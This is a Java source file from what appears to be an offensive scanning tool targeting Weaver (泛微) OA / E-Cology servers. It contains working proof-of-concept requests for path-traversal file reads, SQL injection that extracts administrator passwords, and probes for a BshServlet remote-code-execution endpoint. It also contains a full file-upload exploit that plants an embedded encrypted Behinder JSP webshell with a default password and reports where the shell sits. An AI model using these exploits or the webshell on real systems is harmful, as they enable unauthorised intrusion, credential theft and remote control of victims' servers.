package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;
import com.achuna33.Utils.Utils;
import sun.security.krb5.internal.crypto.Des;

import java.net.MalformedURLException;

@BasicMapping(uri ="泛微OA")
public class WeaverController  extends Controller implements BasicController{
    public static String[] SupportVul; //初始化支持的漏洞
    public static String name = "泛微";
    public WeaverController(){

    }
    @VulnerabilityDescriptionMapping(Description="泛微OA ln.FileDownload 任意文件读取漏洞" ,SupportVulType= com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_ln_FileDownload(Poc_Exp type, String target, Object... args) throws MalformedURLException {

        Cache.uiController.logTextArea.appendText("\n开始检测：  vul_ExcelExport");

        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml");
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 && result.responseBody.contains("pattern")){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n 访问地址："+target+"/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml" );
                }else {
                    WriteLog("\n 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }
    @VulnerabilityDescriptionMapping(Description = "泛微OA getdata.jsp SQL注入漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.SQLInjection)
    public void vul_getdataSqlInjection(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n开始检测：  vul_getdataSqlInjection");
        String url = "/js/hrm/getdata.jsp";
        switch (type){
            case EXP:
                break;
            case POC:
                String targetUrl = target+url+"?cmd=getSelectAllId&sql=select password as id from HrmResourceManager";
                HttpRequest httpRequest = new HttpRequest(targetUrl);
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 ){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n 访问地址："+targetUrl );
                }else {
                    WriteLog("\n 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }

@VulnerabilityDescriptionMapping(Description = "泛微OA uploadOperation.jsp 任意文件上传",SupportVulType = com.achuna33.SupportType.SupportVul.UploadFile)
public void vul_uploadOperation(Poc_Exp type, String target, Object... args) throws MalformedURLException {
    Cache.uiController.logTextArea.appendText("\n开始检测：  vul_getdataSqlInjection");
    String url = "/page/exportImport/uploadOperation.jsp";
    String data = "------WebKitFormBoundary6XgyjB6SeCArD3Hc\r\n" +
            "Content-Disposition: form-data; name=\"file\"; filename=\"test.jsp\"\r\n" +
            "Content-Type: application/octet-stream\r\n" +
            "\r\n" +
            "Shellcode\r\n" +
            "------WebKitFormBoundary6XgyjB6SeCArD3Hc--\r\n";
    switch (type){
        case EXP:
            String path = null;
            String mypayload = null;
            try {
                path = (String) args[0];
                try {
                    byte[] bytes = Utils.readFile(path);
                    mypayload = new String(bytes);
                }catch (Exception e){
                    WriteExpLog("\n [*] 文件读取失败");
                }
            }catch (Exception e){

            }
            String payload = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n";

            if (mypayload!=null){
                payload = mypayload;
            }else {
                WriteExpLog("\n [*] 默认shell 为冰蝎shell 密码 rebeyond");
            }
            String shellpath = Utils.getRandomString(4)+".jsp";
            HttpRequest httpRequest3 = new HttpRequest(target+url);
            httpRequest3.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc");
            httpRequest3.addHeaders("x-forwarded-for","127.0.0.1");
            data = data.replace("Shellcode",payload);
            data = data.replace("test.jsp",shellpath);

            httpRequest3.Post(data);

            Response result1 = new HttpRequest(target +"/page/exportImport/fileTransfer/"+shellpath).Get("");
            if(result1.statusCode==200){
                WriteExpLog("\n[*] shell path:\n"+target +"/page/exportImport/fileTransfer/"+shellpath);
            }else {
                WriteExpLog("\n 访问失败:\n"+target +"/page/exportImport/fileTransfer/"+shellpath);
                WriteExpLog("\n 请验证POC 可靠性 或 EXP免杀性");

            }
            break;
        case POC:
            String targetUrl = target+url;
            String random = Utils.getRandomString(4)+".jsp";
            HttpRequest httpRequest = new HttpRequest(targetUrl);
            httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc");
            httpRequest.addHeaders("x-forwarded-for","127.0.0.1");
            data = data.replace("Shellcode","helloword");
            data = data.replace("test.jsp",random);
            httpRequest.Post(data);
            Response result = new HttpRequest(target+"/page/exportImport/fileTransfer/"+random).Get("");
            if(result.statusCode==200 && result.responseBody.contains("helloword")){
                WriteLog("\n 存在漏洞");
                WriteLog("\n 写入地址："+target+"/page/exportImport/fileTransfer/"+random );
            }else {
                WriteLog("\n 不存在漏洞");
            }
    }
}

@VulnerabilityDescriptionMapping(Description = "",SupportVulType = com.achuna33.SupportType.SupportVul.SQLInjection)
    public void vul_LoginSSOSqlInjection(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        String url = "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager";
    switch (type){
        case EXP:
            break;
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+url);
            String data = "";
            Response result = httpRequest.Get(data);
            if(result.statusCode==200 ){
                WriteLog("\n 存在漏洞");
                WriteLog("\n 访问地址："+target+url );
            }else {
                WriteLog("\n 不存在漏洞");
            }
            //WriteLog("\n"+result.responseBody);
    }
}
@VulnerabilityDescriptionMapping(Description = "泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204",SupportVulType = com.achuna33.SupportType.SupportVul.RuntimeExec)
    public void vul_BshServlet(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        String url = "/weaver/bsh.servlet.BshServlet/";
    switch (type){
        case EXP:
            break;
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+url);
            String data = "";
            Response result = httpRequest.Get(data);
            if(result.statusCode==200 ){
                WriteLog("\n 存在漏洞");
                WriteLog("\n 访问地址："+target+url );
            }else {
                WriteLog("\n 不存在漏洞");
            }
            //WriteLog("\n"+result.responseBody);
    }
}
@VulnerabilityDescriptionMapping(Description = "泛微OA E-Cology users.data 敏感信息泄漏\n",SupportVulType = com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_UserData(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        String url = "/messager/users.data";
    switch (type){
        case EXP:
            break;
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+url);
            String data = "";
            Response result = httpRequest.Get(data);
            if(result.statusCode==200 ){
                WriteLog("\n 存在漏洞");
                WriteLog("\n 访问地址："+target+url );
            }else {
                WriteLog("\n 不存在漏洞");
            }
            //WriteLog("\n"+result.responseBody);
    }
}



}
